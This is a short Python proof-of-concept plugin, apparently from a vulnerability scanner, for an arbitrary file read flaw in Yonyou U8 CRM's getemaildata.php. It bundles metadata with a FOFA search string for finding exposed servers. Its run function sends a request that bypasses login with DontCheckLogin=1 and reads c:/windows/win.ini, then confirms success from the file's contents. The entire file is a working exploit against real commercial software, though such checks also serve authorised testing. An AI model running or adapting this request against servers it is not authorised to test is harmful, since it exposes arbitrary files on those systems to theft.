#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://peiqi.wgpsec.org/wiki/oa/用友OA/用友 U8 CRM客户关系管理系统 getemaildata.php 任意文件读取漏洞.html',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '用友 U8 CRM客户关系管理系统 getemaildata.php 任意文件读取',

      'level'     :   'medium',

      'FOFA'      :   '"用友U8CRM"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/1/4',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Content-Type':'application/json',
      }
  target = '/ajax/getemaildata.php?DontCheckLogin=1&filePath=c:/windows/win.ini'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    # print(res.text)
    if res.status_code == 200 and re.search(r'for 16-bit app support',res.text,re.S):
      # ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret